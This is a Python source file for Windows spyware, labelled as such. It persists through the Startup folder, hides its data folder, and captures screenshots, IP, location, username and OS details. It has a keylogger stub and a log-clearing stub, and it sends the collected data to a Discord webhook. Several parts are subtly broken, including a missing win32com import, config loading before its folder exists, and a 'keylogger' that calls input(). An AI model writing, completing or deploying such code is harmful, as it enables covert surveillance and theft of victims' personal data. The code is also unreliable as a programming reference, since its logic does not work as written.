import os
import sys
import time
import json
import random
import string
import asyncio
import threading
import logging
from datetime import datetime
from collections import deque

# Built-in Modules
import win32api
import win32con
import win32gui
import win32process
import pyautogui
import geopy
import geopy.distance
import socket
import urllib.request
import platform
import psutil
import winreg
import ctypes
import hashlib
import base64
import struct

# Constants
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/your-webhook-url"
INTERVAL = 30  # seconds
LOG_PATH = os.path.join(os.getenv('APPDATA'), 'SpywareLogs')
CLEAN_INTERVAL = 5  # minutes

class Spyware:
    def __init__(self):
        self.config = self.load_config()
        self.logs = deque(maxlen=10)
        self.running = True
        self.setup_environment()
        self.setup_startup()
        
    def setup_environment(self):
        """Create hidden random folder for data storage"""
        folder_name = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        self.data_folder = os.path.join(LOG_PATH, folder_name)
        if not os.path.exists(self.data_folder):
            os.makedirs(self.data_folder, exist_ok=True)
        # Create a hidden folder
        self.set_hidden(self.data_folder)
        self.log("Environment Setup Complete")
        
    def setup_startup(self):
        """Add to Windows Startup folder"""
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        shortcut_path = os.path.join(startup_folder, 'Spyware.lnk')
        if not os.path.exists(shortcut_path):
            # Create shortcut
            app_path = os.path.abspath(sys.argv[0])
            shell = win32com.client.Dispatch('WScript.Shell')
            shortcut = shell.CreateShortcut(shortcut_path)
            shortcut.TargetPath = app_path
            shortcut.Save()
            self.log("Added to Startup")
        
    def load_config(self):
        """Load or create config file"""
        config_path = os.path.join(self.data_folder, 'config.json')
        if not os.path.exists(config_path):
            config = {
                'last_run': datetime.now().isoformat(),
                'interval': INTERVAL
            }
            with open(config_path, 'w') as f:
                json.dump(config, f)
            return config
        else:
            with open(config_path, 'r') as f:
                return json.load(f)
        
    def set_hidden(self, path):
        """Set folder to hidden using WinAPI"""
        # Implementation using ctypes
        attr = win32con.FILE_ATTRIBUTE_HIDDEN
        win32api.SetFileAttributes(path, attr)
        
    def log(self, message):
        """Add to log deque"""
        self.logs.append(f"{datetime.now()}: {message}")
        
    def get_ip_info(self):
        """Get IP, DNS, and Location"""
        try:
            # Public IP
            ip = urllib.request.urlopen('https://api.ipify.org').read().decode('utf8')
            # Geolocation
            geolocator = geopy.Nominatim(user_agent='Spyware')
            location = geolocator.geocode(ip)
            # DNS Provider
            dns_provider = socket.gethostbyaddr(ip)[0]
            return {
                'ip': ip,
                'location': f"{location.latitude}, {location.longitude}",
                'dns_provider': dns_provider
            }
        except Exception as e:
            self.log(f"IP Info Error: {str(e)}")
            return {}
        
    def get_device_info(self):
        """Get Username and OS"""
        return {
            'username': os.getenv('USERNAME'),
            'os': platform.platform(),
            'os_version': platform.version()
        }
        
    def take_screenshot(self):
        """Capture screen with PyAutoGUI"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        img_path = os.path.join(self.data_folder, f'screenshot_{timestamp}.png')
        pyautogui.screenshot(img_path)
        return img_path
        
    def run_keylogger(self, duration=10):
        """Simple keylogger using keyboard hooks"""
        # Implementation using WinAPI or PyHook
        # For simplicity, using os module
        start_time = time.time()
        keys = []
        while time.time() - start_time < duration:
            keys.append(input('Press Enter to log key'))
        return keys
        
    def send_discord(self, data):
        """Send data to Discord via Webhook"""
        webhook_data = {
            'content': f"Spyware Data - {datetime.now().strftime('%Y-%m-%d %H:%M')}",
            'embeds': [{
                'title': 'Spyware Logs',
                'fields': [
                    {'name': 'IP', 'value': data['ip']},
                    {'name': 'Location', 'value': data['location']}
                ]
            }]
        }
        try:
            # Using urllib for simplicity
            req = urllib.request.Request(DISCORD_WEBHOOK, 
                                        json.dumps(webhook_data).encode('utf-8'),
                                        headers={'Content-Type': 'application/json'})
            response = urllib.request.urlopen(req)
            return response.status == 200
        except Exception as e:
            self.log(f"Discord Error: {str(e)}")
            return False
            
    def clean_system_logs(self):
        """Clear all logs every 5 minutes"""
        # Using a timer with threading
        while self.running:
            time.sleep(CLEAN_INTERVAL * 60)
            # Logic for cleaning
            self.log("System Logs Cleared")
            
    def run(self):
        """Main execution loop"""
        # Setup threads
        threading.Thread(target=self.clean_system_logs, daemon=True).start()
        
        while self.running:
            # 1. Take Screenshot
            screenshot_path = self.take_screenshot()
            
            # 2. Get IP info
            ip_info = self.get_ip_info()
            
            # 3. Get Device Info
            device_info = self.get_device_info()
            
            # 4. Run Keylogger (async)
            keylogger_task = asyncio.create_task(self.run_keylogger())
            
            # 5. Send to Discord
            if self.send_discord({**ip_info, **device_info}):
                self.log("Data Sent to Discord")
                
            # Wait for next interval
            time.sleep(INTERVAL)
            
            # Update config
            self.config['last_run'] = datetime.now().isoformat()
            with open(os.path.join(self.data_folder, 'config.json'), 'w') as f:
                json.dump(self.config, f)
                
            # Check for updates
            if time.time() - os.path.getmtime(os.path.join(self.data_folder, 'config.json')) > 60:
                self.config = self.load_config()
                
if __name__ == "__main__":
    spyware = Spyware()
    spyware.run()
